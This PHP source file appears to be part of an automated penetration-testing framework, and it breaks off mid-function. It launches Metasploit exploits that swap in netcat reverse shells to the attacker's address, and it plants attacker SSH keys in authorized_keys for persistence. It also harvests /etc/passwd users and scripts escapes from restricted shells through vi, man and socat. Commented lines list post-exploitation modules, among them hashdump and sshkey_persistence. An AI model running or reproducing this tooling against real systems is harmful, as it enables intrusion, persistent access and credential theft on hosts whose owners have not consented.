<?php

class SERVICE4COM extends AUTH {

    
    public function __construct($eth,$domain,$ip,$port,$protocol) {
        parent::__construct($eth,$domain,$ip,$port,$protocol);	
    }
    
    
    public function msf2exec($file_exploit,$target_ip,$target_port,$attacker_ip,$attacker_port){
        
        // set AutoRunScript multiconsolecommand -cl \"getsystem\",\"getuid\"
        // set AutoRunScript multi_console_command -rc $this->dir_tmp/$kio1_service_smb->ip.$kio1_service_smb->port.post_linux.rc
        // set AutoRunScript post/linux/gather/enum_system
        //$query = "echo \"run post/linux/gather/enum_users_history\nrun post/linux/gather/enum_system\nrun post/linux/gather/enum_configs\nrun post/linux/gather/enum_network\nrun post/linux/gather/enum_protections\nrun post/linux/gather/hashdump\nrun post/linux/manage/sshkey_persistence\" > $this->dir_tmp/$this->ip.$this->port.post_linux.rc";
        //$this->requette($query);
        
        $this->ssTitre(__FUNCTION__);

        $cmd = "";
        $file_exploit = trim($file_exploit);

        if (!empty($file_exploit)){
            $tab_payloads = $this->service8msf8exploit2payloads($file_exploit);
            $this->article("ALL Payloads",$this->tab($tab_payloads));
            
            foreach ($tab_payloads as $payload){
                $payload = trim($payload);
                if (!empty($payload)){
                    //$this->service8msf8exploit2payload2options($file_exploit, $payload);$this->pause();
                    
                    switch ($payload){
                        case "php/exec" :
                                $cmd = "use $file_exploit;set RHOSTS $target_ip;set RPORT $target_port;set payload php/exec;set CMD \"%CMD%\";run;exit";
                           break;
                            }
                    
                }
                
            }
            
            
            $query = "msfconsole -q -x '$cmd' " ;
            $this->pause();
            if (!empty($cmd)) return $query;
            else return $cmd;
        }
    }
    
    
    public function msf2search2exec($cve){
        $cve = trim($cve);
        
        $files_exploit = array();
        $this->ssTitre(__FUNCTION__);
        $shell = "/bin/bash";
        
        $attacker_ip = $this->ip4addr4target($this->ip);
        
        $files_exploit = array_filter($this->msf2search($cve)) ;
        if (!empty($files_exploit)){
            foreach ($files_exploit as $file_exploit){
                if(!empty($file_exploit)){
                    $lport = rand(1024,65535);
                    $file_exploit = trim($file_exploit);
                    $this->article("EXEC $file_exploit", $cve);
                    $cmd_rev = $this->msf2exec($file_exploit,$this->ip,$this->port,$attacker_ip,$lport);
                    if (!empty($cmd_rev)){
                        $templateB64_shell = base64_encode(str_replace("%CMD%", "%SHELL%", $cmd_rev));
                        
                        $rev = $this->rev8nc($attacker_ip, $lport, $shell) ;
                        $cmd = str_replace("%CMD%", $rev, $cmd_rev);
                        $lprotocol = 'T';
                        $type = 'server';
                        $this->service4lan($cmd, $templateB64_shell, $lport, $lprotocol,$type);
                    }
                    
                }
            }
        }
        
    }

    
    public function service4authorized_keys($stream,$authorized_keys_filepath,$authorized_keys_str,$remote_username,$remote_userpass,$local_username,$local_home_user){
        $this->ssTitre(__FUNCTION__);
        $result = "";
        $timeout = 10 ;
        $remote_username = trim($remote_username);
        $private_key_ssh_rsa_file = "$this->dir_tmp/$this->ip.$remote_username.rsa.priv";
        $obj_file = new FILE($private_key_ssh_rsa_file);
        $public_key_ssh_rsa_file = "$obj_file->file_dir/$obj_file->file_name.pub";
        $pass_phrase = '';
        $private_keys = $this->genPrivateKey($private_key_ssh_rsa_file, $pass_phrase);
        $public_keys = $this->key2gen4priv("",10,$private_key_ssh_rsa_file, $public_key_ssh_rsa_file);
        
        if (empty($authorized_keys_filepath)){
            if (!is_dir("$local_home_user/.ssh")) $this->requette("echo '$this->root_passwd' | sudo -S sudo -u $local_username mkdir $local_home_user/.ssh");
            $query = "echo '$remote_userpass' | sudo -S sudo -u $local_username chmod 777 -R $local_home_user/.ssh";
            $this->requette($query);
            $query = "cat $public_key_ssh_rsa_file > $local_home_user/.ssh/authorized_keys";
            $this->requette($query);
            $query = "ls -al $local_home_user/.ssh";
            $this->requette($query);
            $query = "ls -aln $local_home_user/.ssh";
            $this->requette($query);
            $this->pause();
            
            
            $query = "echo '$remote_userpass' | sudo -S chown $local_username:$local_username  $local_home_user/.ssh/authorized_keys";
            $this->requette($query);
            $query = "ls -al $local_home_user/.ssh";
            $this->requette($query);
            $query = "ls -aln $local_home_user/.ssh";
            $this->requette($query);
            $this->pause();
            
            $query = "find $local_home_user -name authorized_keys -type f 2> /dev/null | grep 'authorized_keys' "; // | grep '$find_user'
            $authorized_keys_filepath = trim($this->req_ret_str($query));
        }
        
        if (!empty($authorized_keys_filepath)){
            
            $query = "cat $authorized_keys_filepath";
            $result .= $this->req_str($stream,$query,$timeout);
            $this->pause();
            
            
            if(stristr($authorized_keys_str,$public_keys)) {
                $this->log2succes("FOUND Public key - already exist",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"$authorized_keys_str","");
                echo "Public key already exist\n";
                $result .= "Public key already exist\n";
            }
            else {
                echo "Public key added\n";
                $data = " echo '#".$this->user2agent."' | tee -a $authorized_keys_filepath";
                $result .= $this->req_str($stream,$data,$timeout);
                $data = " echo '$public_keys' | tee -a $authorized_keys_filepath";
                $result .= $this->req_str($stream,$data,$timeout);
                
            }
            $this->pause();
            
            $ssh_open = $this->ip2port4service("ssh");
            if(!empty($ssh_open)) {
                $stream = $this->stream8ssh2key8priv4file($this->ip, $ssh_open, $remote_username, $private_key_ssh_rsa_file);
                if(is_resource($stream)){
                    $info = "SSH Private Key:$private_key_ssh_rsa_file";
                    $this->stream4root($stream);
                }
            }
            
        }
        $this->pause();
        
        return $result;
    }
    
    
    public function service4lan($cmd_rev,$templateB64_shell,$lport,$lprotocol,$type){
        $templateB64_cmd = base64_encode(str_replace("%SHELL%", "%CMD%", base64_decode($templateB64_shell)));
        $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $lport $lprotocol $templateB64_cmd $templateB64_shell $type 30 listening_Server\" ";
        $time = $this->stream_timeout ;       
        if ($type=="client") $this->exec_parallel($cmd_rev, $cmd1, $time);
        if ($type=="server") $this->exec_parallel($cmd1, $cmd_rev, $time);
    }
    

    
    public function parse4etc_passwd($strings_etc_passwd){
        $this->ssTitre(__FUNCTION__);
        $user = array();
        $lines_tab = explode("\n", $strings_etc_passwd);
        foreach ($lines_tab as $line){
            if (preg_match('|^(?<user2name>[a-zA-Z0-9\-\_]{1,}):(?<user2cpw>[[:print:]]{0,}):(?<user2uid>[0-9]{1,}):(?<user2gid>[0-9]{1,}):(?<user2full_name>[[:print:]]{0,}):(?<user2home>[[:print:]]{1,}):(?<user2shell>[[:print:]]{1,})|',$line,$user))
            {
                $this->yesUSERS($this->port2id, $user['user2name'], "cat /etc/passwd", $line);                
                $where = "id8port = '$this->port2id' AND user2name = '$user[user2name]' ";
                $query = "UPDATE AUTH SET user2uid='$user[user2uid]',user2gid='$user[user2gid]',user2def='$user[user2full_name]',user2home='$user[user2home]',user2shell='$user[user2shell]' WHERE $where ;";
                $this->mysql_ressource->query($query);
                $this->tab_users_etc_passwd[] = $user['user2name'];
            }
            
            if (preg_match('|^(?<user2name>[a-zA-Z0-9\-\_]{1,}):(?<user2cpw>[[:print:]]{0,}):(?<user2uid>[0-9]{1,}):(?<user2gid>[0-9]{1,}):(?<user2full_name>[[:print:]]{0,}):(?<user2home>[[:print:]]{1,}):/bin/bash|',$line,$user))
            {
                $this->tab_users_shell[] = $user['user2name'];
            }
            if (preg_match('|^(?<user2name>[a-zA-Z0-9\-\_]{1,}):(?<user2cpw>[[:print:]]{0,}):(?<user2uid>[0-9]{1,}):(?<user2gid>[0-9]{1,}):(?<user2full_name>[[:print:]]{0,}):(?<user2home>[[:print:]]{1,}):/bin/sh|',$line,$user))
            {
                $this->tab_users_shell[] = $user['user2name'];
            }
            
            
        }
        
        //sort($this->tab_users_etc_passwd);
        $this->tab_users_etc_passwd = array_filter($this->tab_users_etc_passwd);
        $this->article("All Users /etc/passwd","\n".$this->tab($this->tab_users_etc_passwd));
        
        //sort($this->tab_users_shell);
        $this->tab_users_shell = array_filter($this->tab_users_shell);
        $this->article("All Users SHELL","\n".$this->tab($this->tab_users_shell));        
    }
    
    public function service8msf($exploit_rc,$lport,$lprotocol,$info,$type,$timeout) {
        // msfvenom -l payloads | grep "cmd/unix/" | awk '{print $1}'
        // cmd/unix/interact
        $type = strtolower(trim($type)) ;
        $cmd1 = "msfconsole -q -y /usr/share/metasploit-framework/config/database.yml -r $exploit_rc ";
        $cmd2 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $lport $lprotocol ".base64_encode($template)." server 30 listening_Server\" ";
        
        if ($type=="client") $this->requette("php parallel.php \"$cmd1\" \"$cmd2\" \"5\" ");
        if ($type=="server") $this->requette("php parallel.php \"$cmd2\" \"$cmd1\" \"5\" ");
    }
    
    
    public function service8msf8exploit2payloads($exploit){
        $exploit = trim($exploit);
        $rst = array();
        $query = "msfconsole -q  -x \"use $exploit;show payloads;exit;\" | grep '/' | awk '{print $2}'";
        if (!empty($exploit)) return $this->req_ret_tab($query);
        else return $rst;
    }
    
    public function service8msf8exploit2payload2options($exploit,$payload){
        $exploit = trim($exploit);
        $payload = trim($payload);
        $query = "msfconsole -q -x \"use $exploit;set payload $payload;show options;exit;\" ";
        if ( (!empty($exploit)) && (!empty($payload)) ) return $this->req_ret_str($query);
        else return "";
    }
    
    
    
    public function stream4key8priv4str($stream,$host,$port,$login,$private_key_str,$private_key_file){
        $this->ssTitre(__FUNCTION__);
        $this->str2file($private_key_str, $private_key_file);
        $obj_file = new FILE($private_key_file);
        $public_key_file = "$obj_file->file_dir/$obj_file->file_name.pub";
        if (!file_exists($public_key_file)) {
            $this->key2gen4priv("",10,$private_key_file, $public_key_file);
        }
        return $this->stream4key8public($stream,$host,$port,$login,$public_key_file,$private_key_file, "");
        
    }
    public function stream8ssh2key8priv4str($host,$port,$login,$private_key_str,$private_key_file,$private_key_passwd){
        $this->ssTitre(__FUNCTION__);
        $this->str2file($private_key_str, $private_key_file);
        $obj_file = new FILE($private_key_file);
        $public_key_file = "$obj_file->file_dir/$obj_file->file_name.pub";
        if (!file_exists($public_key_file)) {
            $this->key2gen4priv("",10,$private_key_file, $private_key_passwd);
            $this->key2gen4public("",10, $private_key_file, $public_key_file,$private_key_passwd);
        }
        return $this->stream8ssh8key8public($host,$port,$login,$public_key_file,$private_key_file, $private_key_passwd);
    }
    
    public function stream8ssh2key8priv4file($host,$port,$login,$private_key_file,$private_key_passwd){
        /*
         https://medium.com/tsscyber/multiple-security-vulnerabilities-in-dell-emc-avamar-e114c16425d0
         */
        $this->ssTitre(__FUNCTION__);
        
        $obj_file = new FILE($private_key_file);
        $public_key_file = "$obj_file->file_dir/$obj_file->file_name.pub";
        
        
        if (!file_exists($public_key_file)) {
            $this->key2gen4priv("",10,$private_key_file, $public_key_file);
        }
        return $this->stream8ssh8key8public($host,$port,$login,$public_key_file,$private_key_file, $private_key_passwd);
    }
    

    
    public function stream4result($stream,$data,$timeout){
        $result = "";
        //$this->ssTitre(__FUNCTION__.": $this->ip");
        $data = trim($data);
        //var_dump( posix_ttyname(STDIN) );var_dump( posix_ttyname(STDOUT) );
        //echo "\n";
        $this->article("Stream Type",get_resource_type($stream));
        
        $this->article("TIMEOUT", $timeout."s");
        $this->article("DATA", $data);
        $data = "echo '".base64_encode($data)."' | base64 -d | /bin/bash - "; // 2> /dev/null
        $this->article("CMDLINE", $data);
        //$this->article("CMD BASE64", $data);
        if(is_resource($stream)){
            
            switch (get_resource_type($stream)){
                // https://www.php.net/manual/fr/resource.php
                
                case "SSH2 Session":
                    $stream = ssh2_exec($stream, $data);
                    //$stream = ssh2_shell($con, 'vt102', null, 80, 24, SSH2_TERM_UNIT_CHARS);
                    //$stream_out = ssh2_fetch_stream($stream, SSH2_STREAM_STDIO);
                    
                    
                    // OK
                    $tmp = "";
                    stream_set_blocking($stream, TRUE);
                    stream_set_timeout($stream, $timeout);
                    //$status = stream_get_meta_data($stream);
                    $result = stream_get_contents($stream);
                    echo $result;
                    //$result .= $this->article("CMD", $data); $this->pause();
                    //  }
                    break;
                    
                    
            case "stream" :
                
                fflush($stream);
                //var_dump($this->stream);
                fputs($stream, "$data\n");
                //stream_socket_sendto($stream, $data,STREAM_OOB,"$this->ip");
                stream_set_blocking($stream, TRUE);
                stream_set_timeout($stream,$timeout);
                //sleep(1);
                //$result = fgetss($stream, 9182);
                $result = @stream_get_contents($stream);
                // 
                while (strstr($result, "[sudo] password for ")){
                    $data = "";
                    fputs($stream, "$data\n");
                    $result = @stream_get_contents($stream);;
                }
                echo $result."\n";
                break;
                
            case "Unknown":
                $this->log2error("unknown stream",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"$this->ip","");
                break;
                
            default:
                $this->log2error("unknown default stream",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"","");
                break;
                
        }
        
    }
    
    return $result;
}

    
    public function service8lan4user($lan2whois){
        $lan2whois = trim($lan2whois);
        $tab_templateB64_id = array();
        $sql_r = "SELECT templateB64_id FROM LAN WHERE id8port = '$this->port2id' AND uid_name = '$lan2whois' AND from_base64(templateB64_id) LIKE \"%ID%\"";
        echo "$sql_r\n";
        $req = $this->mysql_ressource->query($sql_r);
        while ($row = $req->fetch_assoc()) {
            $tab_templateB64_id[] = $row['templateB64_id'];
        }
        $tab_templateB64_id = array_filter($tab_templateB64_id);
        return $tab_templateB64_id;
    }
    
    public function service8lan(){
        $tab_whois8service = array();
        $sql_r = "SELECT uid_name,templateB64_id FROM LAN WHERE id8port = '$this->port2id' ";
        echo "$sql_r\n";
        $req = $this->mysql_ressource->query($sql_r);
        while ($row = $req->fetch_assoc()) {
            $tab_whois8service[] = [$row['uid_name'] => $row['templateB64_id']];
        }
        return $tab_whois8service;
    }
    
    public function  stream8client($lport,$info,$whois,$time2wait){
        $this->titre(__FUNCTION__);
        $result = "";
        // http://php.net/manual/fr/function.socket-import-stream.php
        $info = trim($info);
        $lport = trim($lport);
        $time2wait = (int)$time2wait;
        
        if ($this->protocol=='T') $socket = stream_socket_client("tcp://".$this->ip4addr4target($this->ip).":$lport", $errno, $errstr);
        if ($this->protocol=='U') $socket = stream_socket_client("udp://".$this->ip4addr4target($this->ip).":$lport", $errno, $errstr);
        
        if (!$socket) {
            echo "$errstr ($errno)\n";
            exit();
        } else {
            $this->article("Server Listenning on Port", $lport);
            $this->article("Global TimeOut", $time2wait);
            
            $stream = stream_socket_accept($socket,$time2wait);
            
            
            if (!is_resource($stream)) {
                echo 'Impossible de créer le socket : '. socket_strerror(socket_last_error()) . PHP_EOL;
            }
            stream_set_blocking($stream, FALSE);
            //stream_set_timeout($stream,60);
            
            var_dump( posix_ttyname(STDIN) );
            var_dump( posix_ttyname(STDOUT) );
            
            
            $os = trim($this->ip2os4arch($this->ip2os()));
            switch ($os){
                
                case "windows" :
                case "Windows" :
                    $obj_lan = new lan4win($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $stream,$info);
                    $result .=  $obj_lan->lan4pentest();
                    break ;
                    
                case "Linux" :
                case "Unix" :
                case "linux" :
                case "unix" :
                case "cisco" :
                default:
                    $cmd_id = "id";
                    $result .= $this->stream4root($stream);
                    
                    
                    break ;
            }
            $this->pause();
            fclose($socket);
            
        }
        echo $result;
        return $result;
    }
    
    
    
    
    public function  stream8server($lport,$lprotocol,$templateB64_cmd,$templateB64_shell,$whois,$time2wait){
        $this->titre(__FUNCTION__);
        $result = "";
        // http://php.net/manual/fr/function.socket-import-stream.php
        
        $lport = trim($lport);
        $lprotocol = trim($lprotocol);
        $time2wait = (int)$time2wait;
        $template_cmd = base64_decode($templateB64_cmd);
        
        if ($lprotocol=='T') $socket8server = stream_socket_server("tcp://".$this->ip4addr4target($this->ip).":$lport", $errno, $errstr);
        if ($lprotocol=='U') $socket8server = stream_socket_server("udp://".$this->ip4addr4target($this->ip).":$lport", $errno, $errstr, STREAM_SERVER_BIND);
        
        var_dump($socket8server);
        
        if (!$socket8server) {
            echo "$errstr ($errno)\n";
            die();
        } else {
            $this->article("Server Listenning on Port", $lport);
            $this->article("Protocol", $lprotocol);
            $this->article("Template CMD",$template_cmd );
            $this->article("Whois", $whois);
            $this->article("Global TimeOut", $time2wait);
            
            //var_dump(socket_get_option($socket8server));
            var_dump(stream_socket_get_name($socket8server,TRUE));
            if ($lprotocol=='T') $stream = stream_socket_accept($socket8server,$time2wait);
            if ($lprotocol=='U') $stream = $socket8server;
            var_dump($stream);
            var_dump(stream_socket_get_name($stream,TRUE));
            
            if (!is_resource($stream)) {
                echo 'Impossible de créer la socket : '. socket_strerror(socket_last_error()) . PHP_EOL;
                die();
            }
            stream_set_blocking($stream, FALSE);
            //stream_set_timeout($stream,60);
            
            $this->article("STDIN",posix_ttyname(STDIN));
            $this->article("STDOUTt",posix_ttyname(STDOUT));
            var_dump(stream_get_meta_data($stream));
            
            
            $os = trim($this->ip2os4arch($this->ip2os()));
            switch ($os){
                
                case "windows" :
                case "Windows" :
                    $obj_lan = new lan4win($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $stream,$templateB64_id);
                    $result .=  $obj_lan->lan4pentest();
                    break ;
                    
                case "Linux" :
                case "Unix" :
                case "linux" :
                case "unix" :
                case "cisco" :
                default:
                    $template_id = "%ID%";
                    $templateB64_id = base64_encode($template_id);
                    $id = str_replace("%ID%", "id", $template_id);
                    
                    
                    $template_cmd = base64_decode($templateB64_cmd);
                    $rst = $this->stream4result($stream,$id,10);
                    list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context) = $this->parse4id($rst);
                    $this->article("CREATE Template ID", $template_id);
                    //$this->article("CREATE Template BASE64 ID", $templateB64_id);
                    $this->article("CREATE Template CMD", $template_cmd);
                    //$this->article("CREATE Template BASE64 CMD",$templateB64_cmd);
                    $template_shell = base64_decode($templateB64_shell);
                    $this->article("Template SHELL", $template_shell);
                    
                    
                    
                    $obj_lan = new check4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context);
                    //$obj_lan->lan2pentest8id($template_id);
                    $obj_lan->poc($this->flag_poc);
                    $obj_lan->lan4root();
                    break ;
            }
               fclose($stream);
               fclose($socket8server);
            
        }
        echo $result;
        return $result;
    }
    
    
    public function stream8ssh8key8public($host,$port,$login,$public_key_file,$private_key_file,$private_key_passwd){
        $this->ssTitre(__FUNCTION__);
        $login = trim($login);
        
        $query = "file $private_key_file";
        $check_pem = $this->req_ret_str($query);
        if (strstr($check_pem, "PEM RSA private key")){
            $this->log2succes("Convert PEM for libssh - PHP",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"","");
            $private_key_file = $this->key2gen4priv2pem("", 10, $private_key_file,$private_key_passwd);
        }
        $query = "cat $private_key_file";
        $priv_keys = $this->req_ret_str($query);
        if (empty($priv_keys)) return $this->log2error("Empty Private Key",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"","");
        $query = "cat $public_key_file";
        $pub_keys = $this->req_ret_str($query);
        if (empty($pub_keys)) return $this->log2error("Empty Public Key",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
        $cmd = "id";
        $this->requette("chmod 600 $private_key_file");
        $this->requette("cat $private_key_file");
        $query = "ssh -i $private_key_file $login@$this->ip -p $port -o ConnectTimeout=15 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null  -C id";
        $this->requette($query);

        
        $con = ssh2_connect( $host, $port,array('hostkey'=>'ssh-rsa') );
        if($con===FALSE) {
            echo "\t\r\nFailed Connection \n\n";
            return FALSE ;
        }
        $infos = "Public Key:$public_key_file\nPrivate Key:$private_key_file\nPass Key: $private_key_passwd";
        $this->note($infos);
 

        $this->requette("ls -al $public_key_file");
        $this->requette("file $public_key_file");
        $this->requette("cat $public_key_file");

        $this->requette("ls -al $private_key_file");
        $this->requette("file $private_key_file");
        $this->requette("cat $private_key_file");
        if (ssh2_auth_pubkey_file($con,
            $login,
            $public_key_file,
            $private_key_file,
            "$private_key_passwd")) {
            
            $this->yesAUTH($this->port2id, $login, "", "", "", "", "", "", $infos, $this->ip2geoip());
            $this->log2succes("Identification réussie en utilisant une clé publique",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
            $this->port2shell(base64_encode($infos));
            $this->pause();
            return $con ;
        } else {
            echo "\n\t\r".$this->note('Failed Public Key Authentication')." \n\n";
            return FALSE ;
        }
        
        // $stream = ssh2_shell($con, 'vt102', null, 80, 24, SSH2_TERM_UNIT_CHARS);
        // $stream_out = ssh2_fetch_stream($stream, SSH2_STREAM_STDIO);
        
    }
    
    public function my_ssh_disconnect($reason, $message, $language) {
        $this->log2error("Disconnected from Server [$reason] and message : $message",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
    }
    
    
    
    public function stream8ssh8passwd($host,$port,$login,$mdp) {
        $this->ssTitre(__FUNCTION__);
        $host = trim($host);
        $port = trim($port);
        $login = trim($login);
        $mdp = trim($mdp);

        $template_cmd = "sshpass -p '$mdp' ssh $login@$host -p $port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C \"%CMD%\" ";
        $this->cmd("Create Stream  SSH",$template_cmd);
        
        $con = ssh2_connect( $host, $port);
                     
        if(!$con) {
            $chaine = "Failed Connection";
            $this->log2error($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
            return FALSE ;
        }
        else {
        if (!ssh2_auth_password( $con, $login, $mdp ))
        {
            $chaine = "Failed Auth SSH with Password";
            $this->log2error($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
            return FALSE ;
        }
        else {
            
            $stream_shell = ssh2_shell($con, 'vt102', null, 80, 24, SSH2_TERM_UNIT_CHARS);
            $stream = ssh2_fetch_stream($stream_shell, SSH2_STREAM_STDIO);

        //$stream = ssh2_exec($con, $data);
        
        if (is_resource($stream)){
            $this->note("Success Established Connexion");
            $this->yesAUTH($this->port2id, $login, $mdp,"","", "", "", "",__FUNCTION__);
            $this->port2shell(base64_encode($template_cmd));
            return $stream ;
        }
        else {            
            $chaine = "NOT STREAM";
            $this->log2error($chaine,__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
            var_dump($stream);
            return FALSE; };
        }
        }
        
        
    }
    
    public function stream8shell2check($stream){
        $this->ssTitre(__FUNCTION__);
        $check = "";
        if (is_resource($stream)){
        $str = sha1($this->user2agent,FALSE);
        $data = "echo '$str' ";
        $data_check = "echo ".base64_encode($data)." | base64 -d | bash -";
        $this->article("EXEC FROM STREAM", $data_check);
        fputs($stream, "$data_check\n");
        $tmp = "";
        //while(!feof($stream) && empty($tmp) && sleep(10) ){
        $tmp = stream_get_contents($stream);
        $tmp = trim($tmp);
        
        //var_dump($tmp);
        
        $tmp2 = array();
        exec("echo \"$tmp\" | grep -Po \"^$str\" ",$tmp2);
        
        if (!empty($tmp2)) $check = $tmp2[0];
        unset($tmp2);
        
        if (stristr($check,$str)) {
            $this->note("Success Executed Command");
            return TRUE ;
        }
        else {
            $chaine = "DO NOT FOUND $str - COMMAND NOT EXECUTED";
            $this->note($chaine);
            $this->log2error("NOT bash SHELL",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
            /*
            https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
            https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/
            https://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref
            */
            var_dump($tmp);
            $data = "echo \$SHELL";
            $this->article("DATA", $data);
            fputs($stream, "$data\n");
            
            
            $tmp = stream_get_contents($stream);
            echo "$tmp\n";
            exec("echo '$tmp' $this->filter_file_path",$tmp2);
            if (!empty($tmp2)) {
                $shell_found = $tmp2[0];
                if (strstr($shell_found, "lshell")) $this->article("LIMITED SHELL", $shell_found);
                if (strstr($shell_found, "rbash"))  $this->article("RESTRICTED Bash", $shell_found);
                if (strstr($shell_found, "rksh"))  $this->article("Korn Shell in restricted mode", $shell_found);
                if (strstr($shell_found, "rzsh"))  $this->article("RESTRICTED SHELL", $shell_found);
                if (strstr($shell_found, "rssh"))  $this->article("Restricted Secure Shell", $shell_found);
            }
            return FALSE;
        }
        }
        else return FALSE ;
    }
    
    
    public function stream4check($stream,$template_cmd,$username,$userpass){
        $this->ssTitre(__FUNCTION__);
        $check = "";
        $shell_found = "";
        if (is_resource($stream)){
            

            //$data = "/bin/bash -li ";
            
            stream_set_timeout($stream,$this->stream_timeout);
            stream_set_blocking($stream, TRUE);
            

            
            if ($this->stream8shell2check($stream)) {
                
                $template_id = "%ID%";
                $template_shell = str_replace("%CMD%", "%SHELL%", $template_cmd);
                return array($stream,$template_id,$template_cmd,$template_shell) ;
            }
            else {
                
                //https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/
                
                //  ===================================================================
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "echo \$PATH";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $rst_path = stream_get_contents($stream);
                echo "$rst_path\n";
                
                $data = "ls $(echo \$PATH)";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $rst_path2 = stream_get_contents($stream);
                echo "$rst_path2\n";
                

                
                $data = "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; /usr/bin/id";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                
                $rst_id = stream_get_contents($stream);                
                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
                if (!empty($uid_name)){
                    $cmd = "%CMD%";                   
                    $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
                    $template_cmd_new = str_replace("%ID%", "%CMD%", $template_id_new);
                    $template_shell_new = str_replace("%CMD%","%SHELL%", $template_cmd_new);
                    return array($stream,$template_id_new,$template_cmd_new,$template_shell_new) ;
                    
                }
                $this->pause();
                

                
                $data = "help";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $rst_help =  stream_get_contents($stream);
                echo "$rst_help\n";
                
                $data = "info bash";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                echo stream_get_contents($stream);
      
                
                $data = "(sleep 15; echo \"! bash -li\";sleep 8 ; ) | socat - EXEC:\"man man\",pty,stderr,setsid,sigint,ctty,sane";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $rst_app =  stream_get_contents($stream);
                echo "$rst_app\n";
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "echo -e \"man man <<# >/dev/null 2>&1\n! bash -li\nwhoami > /dev/tty\nls > /dev/tty\n#\" | bash ";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                echo  stream_get_contents($stream);
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                

                $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nid > /dev/tty\nls > /dev/tty\n#\" | bash ";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                echo  stream_get_contents($stream);
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nid > /dev/tty\nls > /dev/tty\n#\"  ";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                echo  stream_get_contents($stream);
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nid\n#\" ";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                echo  stream_get_contents($stream);
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nid\necho \$0\n > /dev/tty\n#\" ";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                echo  stream_get_contents($stream);
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                
                $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\n#\" ; export SHELL=/bin/bash:\$SHELL ; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; /usr/bin/id";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                
                $rst_id = stream_get_contents($stream);
                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
                if (!empty($uid_name)){
                    $cmd = "%CMD%";
                    $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
                    $template_cmd_new = str_replace("%ID%", "%CMD%", $template_id_new);
